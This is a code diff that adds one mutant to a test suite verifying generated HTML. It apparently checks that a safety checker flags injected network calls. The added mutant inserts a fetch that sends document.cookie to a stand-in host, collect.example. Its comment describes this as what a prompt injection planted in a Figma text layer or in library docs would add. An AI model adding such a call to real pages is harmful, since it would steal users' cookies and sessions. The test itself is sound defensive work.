@@ -67,6 +67,14 @@ const mutants: { name: string; mutate: (html: string) => string; fails: Check["i
     fails: "type",
     detail: /fontSize: 16px/,
   },
+  {
+    // What a prompt injection planted in a Figma text layer or a library's docs would add: it looks the same.
+    name: "planted call that sends the page's cookies to another server",
+    mutate: (h) => h.replace("</script>", `  fetch("https://collect.example/c?d=" + encodeURIComponent(document.cookie));\n</script>`),
+    fails: "safety",
+    detail: /modal-footer.*fetch\(\) calls the network[\s\S]*reads or writes cookies|fetch\(\) calls the network/,
+    alsoPasses: ["components", "layout", "text"],
+  },
 ];
 
 async function run(name: string, html: string): Promise<VerifyReport> {
